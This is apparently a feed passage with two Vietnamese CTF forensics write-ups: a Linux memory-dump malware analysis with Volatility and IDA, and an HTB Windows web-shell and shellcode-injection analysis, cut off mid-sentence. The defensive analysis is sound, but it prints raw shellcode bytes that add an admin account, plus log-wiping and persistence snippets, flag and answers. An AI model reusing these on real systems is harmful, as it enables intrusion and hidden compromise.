&amp;gt; 9f9d089ad84173dc40e910ad1ba1d584bb5c9b2e82ae2164d6bd22d3b37a7588
[+] Correct!

What is the full path to the malicious elf file ?
&amp;gt; /root/malware-f
[+] Correct!

The malware checks for virtual environments through a system file, what is it ? (full path)
&amp;gt; /proc/cpuinfo
[+] Correct!

The malware installed a fake service as a persistence mechanism, what was the service name ?
&amp;gt; .dbus.service
[+] Correct!

The malware connects to two C2 IPs, what are they ? (ip1 - ip2)
&amp;gt; 185.143.223.107-45.133.216.219
[-] Wrong Answer.

The malware connects to two C2 IPs, what are they ? (ip1 - ip2)
&amp;gt; 185.143.223.107 - 45.133.216.219
[+] Correct!

The malware copies itself and imitates a library, where is it stored ?
&amp;gt; /lib/.X11-unix/.X1
[+] Correct!

What command does the malware use to make the new copied file immutable ?
&amp;gt; chattr +i
[+] Correct!

What three debugging techniques does the malware specifically check for in its anti-debug routine ? (1-2-3)
&amp;gt; LD_PRELOAD-strace-ltrace
[+] Correct!

Looks like the malware is injecting an ssh key, what type is this key ?
&amp;gt; ssh-ed25519
[+] Correct!

Where is that key being injected ? (full path)
&amp;gt; /root/.ssh/authorized_keys
[+] Correct!

What command is the malware using to clear all traces of executed commands ?
&amp;gt; history -c
[-] Wrong Answer.

What command is the malware using to clear all traces of executed commands ?
&amp;gt; history -c
[+] Correct!

How often is the log cleaning function being executed ? (in seconds)
&amp;gt; 3600
[+] Correct!

[+] Here is the flag:
DEAD{You_still_like_memory_dumps_4c914fa51685e7b6}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Answer 1 và 2&lt;/h3&gt;
&lt;p&gt;Để trả lời cho câu 2 sử dụng plugin linux.bash
nhưng tới câu 3 đã tốn rất nhiều thời gian vì các plugin liên quan đến dump file đều không hoạt động tốt vì thế tôi đã sử dụng volshell để dump và biết được các page khi được volatility load từ physical address sang virtual address đã không được mapping đủ page dẫn đến lỗi khi dump file&lt;/p&gt;
&lt;h3&gt;using volshell to dump raw data ELF&lt;/h3&gt;
&lt;p&gt;Thông thường trong Volatility 3:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Physical (Contains the Physical Address Space: ELF, RAW, VMware, LiME)&lt;/li&gt;
&lt;li&gt;Virtual (Contains Virtual Addresses (and their Data))&lt;/li&gt;
&lt;li&gt;File Layer (Responsible for operating on the snapshot file)&lt;/li&gt;
&lt;li&gt;Swap (Implements analysis for the swap partition)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryc9RBUvgx.png&quot; alt=&quot;image&quot; /&gt;
&lt;strong&gt;The Kernel Layer is just a Virtual Layer (a layer that contains virtual addresses)&lt;/strong&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/r17T0SUvex.png&quot; alt=&quot;image&quot; /&gt;
kiểm tra các lớp layers của file memory
&lt;img src=&quot;https://hackmd.io/_uploads/B1bEgLLPel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;-&amp;gt; đây là một file ELF snapshort&lt;/strong&gt;
&lt;strong&gt;RAW vs ELF snapshot&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Với ELF snapshot (được dump qua core dump hay gdb, hoặc plugin tạo ELF), layer đầu tiên là FileLayer, vì ELF là định dạng file.&lt;/li&gt;
&lt;li&gt;Với RAW memory dump, file chính là physical memory → không cần FileLayer, bắt đầu luôn bằng PhysicalMemoryLayer.
&lt;strong&gt;Điểm hội tụ là Virtual Layer&lt;/strong&gt;, nơi các plugin truy cập để đọc địa chỉ ảo của tiến trình hoặc kernel.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Ý nghĩa kỹ thuật của Virtual Layer trong Volatility 3&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Virtual Address Space
Trong hệ điều hành hiện đại, mỗi process có một Virtual Address Space (VAS) riêng.
VAS này được ánh xạ (translated) tới Physical Memory (RAM) thông qua Page Tables, mà gốc là CR3 hoặc PGD (Page Global Directory).&lt;/li&gt;
&lt;li&gt;Layer in memory
Với một file dump từ RAM (🔸RAW Snapshot) như bạn đang dùng (dump.mem), file chính là không gian địa chỉ vật lý (Physical Address Space).
Theo hình, Volatility sẽ thiết lập các lớp sau:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;[File Layer] → [Memory Layer] → [Virtual Layer]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vậy &quot;Virtual Layer&quot; là gì trong ngữ cảnh này?
➤ Virtual Layer là lớp ánh xạ Virtual Address Space của hệ điều hành (VD: địa chỉ của code trong process, stack, heap) → tới Memory Layer (địa chỉ vật lý RAM thực tế).&lt;/p&gt;
&lt;p&gt;➤ Đối với từng process, mỗi process có một Page Table riêng (CR3), tức mỗi process có ánh xạ riêng giữa địa chỉ ảo và địa chỉ vật lý.(Kiểu như thế giới quan khác nhau)
Dựa vào sơ đồ:&lt;/p&gt;
&lt;p&gt;🟧 Virtual Layer (cho kernel): được tạo sẵn để các plugin như linux.pslist, linux.lsmod, … có thể truy cập địa chỉ ảo của kernel.&lt;/p&gt;
&lt;p&gt;✅ Để đọc đúng Virtual Address của từng process (như start_code, vm_area_struct, …), &lt;strong&gt;ta cần tạo thêm một Virtual Layer riêng biệt cho process đó&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Và file memory mà ta đang phân tích là định dạng ELFSnapshort nên nó sẽ đi sang một lớp trung gian mới tới lớp memory layer là lớp base layer
như khái niệm trên memory layer mới phản ánh đúng offset address trên disk&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJZbBD8vle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hy_ufd8vgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJF9dwLDxg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Tiến hành xác định malicious process &quot;malware-f&quot;
&lt;img src=&quot;https://hackmd.io/_uploads/Hk3ZiSIvlg.png&quot; alt=&quot;image&quot; /&gt;
So sánh offset address từ pslist
&lt;img src=&quot;https://hackmd.io/_uploads/H14UoSUwxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Dump process&lt;/h3&gt;
&lt;p&gt;Trong Linux kernel, task_struct là cấu trúc dữ liệu đại diện cho một process. Trường mm (memory descriptor) là con trỏ tới một cấu trúc mm_struct, đại diện cho không gian địa chỉ ảo của process. Đây là nơi kernel lưu thông tin về mappings (code, data, stack, v.v.).&lt;/p&gt;
&lt;p&gt;Xác định địa chỉ bắt đầu và địa chỉ cuối của file
&lt;img src=&quot;https://hackmd.io/_uploads/H18Ot8UPxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Lấy raw data ở layer_name
&lt;img src=&quot;https://hackmd.io/_uploads/S1jgpSUvxl.png&quot; alt=&quot;image&quot; /&gt;
Đã bị error PagedInvalidAddressExcaption chuyển sang base_layer
&lt;img src=&quot;https://hackmd.io/_uploads/S1IU6H8wlg.png&quot; alt=&quot;image&quot; /&gt;
Chuyển sang memory layer
&lt;img src=&quot;https://hackmd.io/_uploads/ryYYTrIvll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Vì sao lỗi xảy ra?&lt;/h3&gt;
&lt;p&gt;Các khái niệm trước đã nói rõ mỗi process trong virtual address space sẽ được mapping qua memory một cách khác nhau (cũng như là thế giới quan khác nhau) xem lại &lt;strong&gt;Virtual Layer Diagram&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Kết luận:&lt;/strong&gt;
Giải pháp khắc phục, thay vì đọc tự động từ layer_name ra ta nên dùng Volatility 3 API đúng cách để tạo layer không gian địa chỉ người dùng của tiến trình:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkEOZILDlx.png&quot; alt=&quot;image&quot; /&gt;
lúc này ta đã có thêm một layer của process sử dụng layer này để dump file
demo:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;layer = self.context.layers[proc_layer].mapp
         ...: ing(0x55bde0168000,16)

[layer_name]&amp;gt; print(layer)
&amp;lt;generator object Intel.mapping at 0x7d046328bc40&amp;gt;

[layer_name]&amp;gt; print(list(layer))
[(94273996750848, 16, 587874304, 16, &apos;memory_layer&apos;)]


ý nghĩa:
(va_start, va_len, pa_start, pa_len, layer_name)
va_start : Virtual Address bạn yêu cầu ánh xạ
va_len : 	Độ dài vùng bạn yêu cầu
pa_start : 	Địa chỉ physical tương ứng trong layer &apos;memory_layer&apos;
pa_len : Độ dài physical mapping
layer_name: Tên layer vật lý chứa dữ liệu thực tế
Check nhanh với 16 bytes đầu
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Kiểm tra thử data tại memory layer
&lt;img src=&quot;https://hackmd.io/_uploads/BJ34kdLvlg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Tiến hành dump file
&lt;img src=&quot;https://hackmd.io/_uploads/B1pbfUUPex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkaXMUUwlx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;bây giờ đã không còn lỗi nữa check file&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(thong㉿MSI)-[/mnt/c/users/tttho/downloads/CTFchall/hacktheon/mem]
└─$ file malware-f
malware-f: data
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkACdI8Pgl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;file đã bị mất đi header kiểm tra lại offset address file với plugin linux.proc.Maps để xác định các offset sau khi mapping&lt;/p&gt;
&lt;p&gt;Plugin linux.proc.Maps hiển thị Virtual Memory Mappings của từng tiến trình giống với nội dung /proc/[pid]/maps&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkB-d88Plx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Clearly the base address of this file is started at 0x55bde0168000 but When I trace start address in volshell it displayed at 0x55bde0169000 we have lost 1000 bytes at header ELF files, We dump it again from 0x55bde0168000-0x55bde016e0000&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[layer_name]&amp;gt; elf_data = layer.read(0x55bde0168000,0x6000)
         ...:

[layer_name]&amp;gt; with open(&quot;malware-f&quot;,&quot;wb&quot;) as f:
         ...:     f.write(elf_data)
         
┌──(thong㉿MSI)-[/mnt/c/users/tttho/downloads/CTFchall/hacktheon/mem]
└─$ file malware-f
malware-f: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Đây là cách dump mapping tự động theo virtual address space riêng của process như cơ chế của volatility3
vậy ta thử mapping tự động riêng một cách bình thường&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[layer_name]&amp;gt; proc_layer = proc_target.add_process_layer()
         ...:

[layer_name]&amp;gt; data = self.context.layers[proc_layer].mappi
         ...: ng(0x55bde0168000,0x6000)

[layer_name]&amp;gt; print(list(data))
[(94273996750848, 4096, 587874304, 4096, &apos;memory_layer&apos;), (94273996754944, 4096, 456658944, 4096, &apos;memory_layer&apos;), (94273996759040, 4096, 620683264, 4096, &apos;memory_layer&apos;), (94273996763136, 4096, 597250048, 4096, &apos;memory_layer&apos;), (94273996767232, 4096, 630095872, 4096, &apos;memory_layer&apos;), (94273996771328, 4096, 597127168, 4096, &apos;memory_layer&apos;)]

[layer_name]&amp;gt; dump = b&apos;&apos;

[layer_name]&amp;gt; for va_start, va_len, pa_start, pa_len, layer in self.context.
         ...: layers[proc_layer].mapping(0x55bde0168000, 0x6000):
         ...:     chunk = self.context.layers[layer].read(pa_start, pa_len)
         ...:     dump += chunk
         ...:

[layer_name]&amp;gt; with open(&quot;malware-f2&quot;,&quot;wb&quot;) as f:
         ...:     f.write(dump)
         
         
┌──(thong㉿MSI)-[/mnt/c/users/tttho/downloads/CTFchall/hacktheon/mem]
└─$ sha256sum malware-f2
b6e7756044984f2f5a0de3be9e6f2dbaf26ef1d0d4ebaddd35a7c1e21cf8a9c1  malware-f2

┌──(thong㉿MSI)-[/mnt/c/users/tttho/downloads/CTFchall/hacktheon/mem]
└─$ sha256sum malware-f
b6e7756044984f2f5a0de3be9e6f2dbaf26ef1d0d4ebaddd35a7c1e21cf8a9c1  malware-f
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;reverse file with IDAPro
&lt;img src=&quot;https://hackmd.io/_uploads/HkxP9ILPle.png&quot; alt=&quot;image&quot; /&gt;
thấy các string liên quan đến sandbox như hypervisor and VMware xref tới kiểm tra
&lt;img src=&quot;https://hackmd.io/_uploads/HyCFc8IDlg.png&quot; alt=&quot;image&quot; /&gt;
đây rõ ràng là anti sandbox&lt;/p&gt;
&lt;h3&gt;Answer 3 : /proc/cpuinfo&lt;/h3&gt;
&lt;h3&gt;4. The malware installed a fake service as a persistence mechanism, what was the service name ?&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hk2kiIIwgg.png&quot; alt=&quot;image&quot; /&gt;
tiếp tục check string
&lt;img src=&quot;https://hackmd.io/_uploads/HyLQoLUvxe.png&quot; alt=&quot;image&quot; /&gt;
→ Malware tạo một file service systemd giả mạo tên: &lt;strong&gt;dbus.service&lt;/strong&gt;
Sau đó nó tạo symbolic link từ file đó sang:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/etc/systemd/system/.dbus.service
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;→ Cuối cùng dùng lệnh:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;systemctl enable --now .dbus.service
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;để kích hoạt service giả mạo đó.&lt;/p&gt;
&lt;h3&gt;Answer 4 : .dbus.service&lt;/h3&gt;
&lt;h3&gt;5. The malware connects to two C2 IPs, what are they ? (ip1 - ip2)&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJuQh8Ivxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Answer 5 : 185.143.223.107 - 45.133.216.219&lt;/h3&gt;
&lt;h3&gt;6.The malware copies itself and imitates a library, where is it stored ?&lt;/h3&gt;
&lt;p&gt;copy chính nó chúng ta sẽ target đến /proc/self/exe
&lt;img src=&quot;https://hackmd.io/_uploads/HJZs28Ivlx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Answer 6: /lib/.X11-unix/.X1&lt;/h3&gt;
&lt;h3&gt;7. What command does the malware use to make the new copied file immutable ?&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkIR28Lvee.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sub_1886(&quot;/lib/.X11-unix/.X1&quot;, 1LL);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Đây là khi gọi hàm truyền 1 -&amp;gt; chattr +i&lt;/p&gt;
&lt;h3&gt;Answer 7 : chattr +i&lt;/h3&gt;
&lt;h3&gt;8. What three debugging techniques does the malware specifically check for in its anti-debug routine ? (1-2-3)&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rk5s68Lwge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Answer 8 : LD_PRELOAD-strace-ltrace&lt;/h3&gt;
&lt;h3&gt;9. Looks like the malware is injecting an ssh key, what type is this key ?&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyUR6UUDge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Answer 9: ssh-ed25519&lt;/h3&gt;
&lt;h3&gt;10. Where is that key being injected ? (full path)&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rygGCLUPel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Answer 10 : /root/.ssh/authorized_keys&lt;/h3&gt;
&lt;h3&gt;11. What command is the malware using to clear all traces of executed commands ?&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;__int64 sub_1E27()
{
  __int64 v1; // [rsp+8h] [rbp-8h]

  sub_1040(&quot;/var/log/auth.log&quot;);
  sub_1040(&quot;/var/log/secure&quot;);
  sub_1040(&quot;/var/log/wtmp&quot;);
  v1 = sub_1220(&quot;/var/log/syslog&quot;, &quot;w&quot;);
  if ( v1 )
    sub_1080(v1);
  return sub_10E0(&quot;history -c&quot;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Answer 11: history -c&lt;/h3&gt;
&lt;h3&gt;12. How often is the log cleaning function being executed ? (in seconds)&lt;/h3&gt;
&lt;p&gt;Hàm ở câu trên là hàm xóa log vì vậy ở hàm main có một vòng lập while true
&lt;img src=&quot;https://hackmd.io/_uploads/rJtJJwLPxe.png&quot; alt=&quot;image&quot; /&gt;
sleep(3600) trước khi xóa
-&amp;gt; 3600&lt;/p&gt;
&lt;h3&gt;Answer 12 : 3600&lt;/h3&gt;
</content:encoded></item><item><title>HTB Window&apos;s Infinity Edge</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/windowsedge/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/windowsedge/</guid><pubDate>Thu, 24 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;HTB Window&apos;s Infinity Edge&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;author : kAiZ3n
Decription : A motivated APT group has breached our company and utilized custom tooling. We&apos;ve identified the implants on compromised systems and remediated the infection using advanced AntiVirus X. However, one server seems clean but has been exhibiting suspicious traffic. Can you spot something we could have missed while cleaning this system?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Xử lý file pcap&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyUa_qAIlx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Đầu tiên ta thấy Client gửi request tới server thông qua format multi data và ta thấy client đã Post một file upload.apsx thông qua /upload
tại lúc xử lý file tôi thấy nó sử dụng một Class Assembly.Load() đây được coi là red flag thường được dùng load các mal EXE or DLL&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Tạo môt Instance để runtime trong .NET&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sau đó nó sẽ truyền parameter vào là p and r&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;p là dữ liệu người dùng trong requestFrom từ &quot;data&quot;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;r là hardcode
&lt;img src=&quot;https://hackmd.io/_uploads/HJtyO90Lge.jpg&quot; alt=&quot;payload&quot; /&gt;
trích xuất ra file payload.exe check file nhanh với die thì đây là file .NET load vào ILSPY để đọc source
&lt;img src=&quot;https://hackmd.io/_uploads/S1i4O90Lxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;RequestForm[&quot;data&quot;] là phân vùng bị enc code&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;r là password như một hardcode key&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;iv = &quot;infinity_edgehtb&quot; (hardcode)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Attacker sẽ gửi payload ExecRunTime đã bị mã hóa thông qua RequestFrom[&apos;data&apos;]&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sau đó sẽ dùng key và iv decrypt và thực thi với Invoke&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Decryption Traffic&lt;/h2&gt;
&lt;p&gt;Check file pcap với các trường data= được gửi trong file shell.apsx
&lt;img src=&quot;https://hackmd.io/_uploads/rJrB5cCLlg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkUNq9ALex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Đây là script tôi xử lý
&lt;img src=&quot;https://hackmd.io/_uploads/H1ilcqAUxg.jpg&quot; alt=&quot;decrypt&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Phân tích Traffic PlainText&lt;/h2&gt;
&lt;p&gt;Format output trong file Decrypt.bin
&lt;img src=&quot;https://hackmd.io/_uploads/HJnqq9ALll.png&quot; alt=&quot;image&quot; /&gt;
Đúng như idea ban đâu mỗi lần Request payload sẽ có một class SharPyShell và func ExecRunTime để Invoke và thực thi trên server theo như logic file NET&lt;/p&gt;
&lt;h3&gt;Tiếp theo nó sẽ Drop một tool powershell script dùng để leo quyền (Privilege Escalation)&lt;/h3&gt;
&lt;p&gt;Spawn một cái powershell
&lt;img src=&quot;https://hackmd.io/_uploads/SJxKCHALee.jpg&quot; alt=&quot;payloadshell&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ByQU8IpLge.png&quot; alt=&quot;image&quot; /&gt;
Decrypt payload với base sau đó Xor với key
và chạy tools với các đối số
Output
&lt;img src=&quot;https://hackmd.io/_uploads/SJECLIaIlg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;Xử lý Shellcode&lt;/h3&gt;
&lt;p&gt;Trong Script được gửi bởi attacker thì có 2 function InjectionShellcodeAsUser và InjectionShellcode&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkyA3BCIxl.jpg&quot; alt=&quot;payloadshell&quot; /&gt;&lt;/p&gt;
&lt;p&gt;snapshort ThreadParametes được truyền vào
&lt;img src=&quot;https://hackmd.io/_uploads/B1wgqGpIle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Đăng nhập với user&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Tạo một Process cmd.exe hoặc nếu Process có sẳn sẽ lấy PID được truyền vào hàm Injection Shellcode
Mở Handle targetProcessHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, processId); đóng vai trò Spawn Host cho DLL&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Tính size và allocate shellcode vào memory và tính toán offset trong Memory với VirtualAllocA() và ghi shellcode vào vùng nhớ đó trong Process với WriteMemory()
&lt;strong&gt;IntPtr codeMemAddress = VirtualAllocEx(targetProcessHandle, IntPtr.Zero, codeMemorySize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Tạo thread trong tiến trình cmd.exe:
Tạo RemoteThread chạy shellcode tại codeMemAddress, truyền threadParameterAddress vào.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;Đây gọi là kỹ thuật RemoteThread Injection&lt;/strong&gt;
&lt;strong&gt;Tương tự cho InjectionShellcode&lt;/strong&gt;&lt;/p&gt;
&lt;h3&gt;Phân tích shellcode DLL với IDAPro&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;Tại điểm này call InjectShellcode với Entry 0x2880&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Chương trình sẽ gọi tới EntryPoint&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkVx6B08xl.png&quot; alt=&quot;image&quot; /&gt;
Chương trình sẽ parser input và truyền vào hàm Juicy với phần payload shellcode&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ThreadParameter:
    [filepath]\0
    [application_name]\0
    [CLSID]\0
    [port_Source]\0
    [ip_source]\0
    [port Destination]\0
    [ip_Dest]\0
    [Size of Payload Shellcode]\0
    [string_after_number]

&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Parser ThreadParameter&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJYD9BRLel.png&quot; alt=&quot;code&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Output:
[+] Parsed Data:
  filepath: C:\Windows\Temp\x1fvogijp5pyzn7\9nu8w1q
  application_name: notepad.exe
  clsid: {4991d34b-80a1-4291-83b6-3328366b9097}
  port_or_id: 48278
  ip_source: 127.0.0.1
  extra_wstring: 135
  copied_ascii: 127.0.0.1
  Juicy Payload size: 402
  juicy_payload: b&apos;\xfcH\x83\xe4\xf0\xe8\xc0\x00\x00\x00AQAPRQVH1\xd2eH\x8bR`H\x8bR\x18H\x8bR H\x8brPH\x0f\xb7JJM1\xc9H1\xc0\xac&amp;lt;a|\x02, A\xc1\xc9\rA\x01\xc1\xe2\xedRAQH\x8bR \x8bB&amp;lt;H\x01\xd0\x8b\x80\x88\x00\x00\x00H\x85\xc0tgH\x01\xd0P\x8bH\x18D\x8b@ I\x01\xd0\xe3VH\xff\xc9A\x8b4\x88H\x01\xd6M1\xc9H1\xc0\xacA\xc1\xc9\rA\x01\xc18\xe0u\xf1L\x03L$\x08E9\xd1u\xd8XD\x8b@$I\x01\xd0fA\x8b\x0cHD\x8b@\x1cI\x01\xd0A\x8b\x04\x88H\x01\xd0AXAX^YZAXAYAZH\x83\xec AR\xff\xe0XAYZH\x8b\x12\xe9W\xff\xff\xff]H\xba\x01\x00\x00\x00\x00\x00\x00\x00H\x8d\x8d\x01\x01\x00\x00A\xba1\x8bo\x87\xff\xd5\xbb\xf0\xb5\xa2VA\xba\xa6\x95\xbd\x9d\xff\xd5H\x83\xc4(&amp;lt;\x06|\n\x80\xfb\xe0u\x05\xbbG\x13roj\x00YA\x89\xda\xff\xd5cmd /c &quot;net user /add admin_infinity &quot;&quot;Password2!&quot;&quot; /Y &amp;amp; net localgroup Administrators admin_infinity /add &amp;amp; echo xGk89_Ew &amp;gt; C:\\xor.k&quot;\x00&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;trong Hàm Juicy có tạo một Thread với function StartAddress cho việc xử lý Connection Network
và tại hàm Juicy tiếp quy trình Spawn Host Process và Injection Shellcode với &lt;strong&gt;CreateRemoteThread&lt;/strong&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SJwmASRIll.png&quot; alt=&quot;image&quot; /&gt;
&lt;strong&gt;Thành phần	Mục đích&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;a1 (CLSID)	Gọi COM trigger để lấy token SYSTEM&lt;/li&gt;
&lt;li&gt;a3, a4 (payload, size)	Shellcode được inject vào process mới&lt;/li&gt;
&lt;li&gt;CoGetInstanceFromIStorage	Trigger đối tượng COM&lt;/li&gt;
&lt;li&gt;CreateProcessWithTokenW / CreateProcessAsUser	Tạo process với token SYSTEM
WriteProcessMemory + CreateRemoteThread	Inject và thực thi payload&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Dấu hiệu tấn công / detection&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tạo ILockBytes, IStorage giả.&lt;/li&gt;
&lt;li&gt;Gọi CoGetInstanceFromIStorage với CLSID lạ.&lt;/li&gt;
&lt;li&gt;CreateProcessWithTokenW + VirtualAllocEx + WriteProcessMemory&lt;/li&gt;
&lt;li&gt;CLSID thường là COM hijack hoặc UAC bypass trigger.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Dump shellcode payload juicy ra va dung Floss
&lt;img src=&quot;https://hackmd.io/_uploads/ryhHZURLgl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;InjectShellcodeAs be called và xử lý với x64dbg&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Skd2W8CLlx.png&quot; alt=&quot;InjectShellcodeAS&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/ry_lMU0Lgg.png&quot; alt=&quot;image&quot; /&gt;
shellcode này có dung tệp C:\xor.k được  tạo từ shellcode juicy payload
tôi sử dụng shcode2.py để convert shellcode.bin to EXE và debug nó trong x64dbg
&lt;img src=&quot;https://hackmd.io/_uploads/B1axpKAUee.png&quot; alt=&quot;image&quot; /&gt;
ngay tại điểm đầu code nó đã call một function và ta thấy các giá trị &quot;C:\xor.k được hiển thị&quot;
&lt;img src=&quot;https://hackmd.io/_uploads/S1Q2pFRUge.png&quot; alt=&quot;image&quot; /&gt;
Thử debug và chương trình đã bị crash ở vùn đọc file tôi nghĩ do không thể truy cập vùng nhớ lúc đọc file và tôi sẽ cấp quyền cho 2 vùng nhớ [rsp+10] và [rsp+20] sau đó debug tiếp
Tại offset&lt;/p&gt;
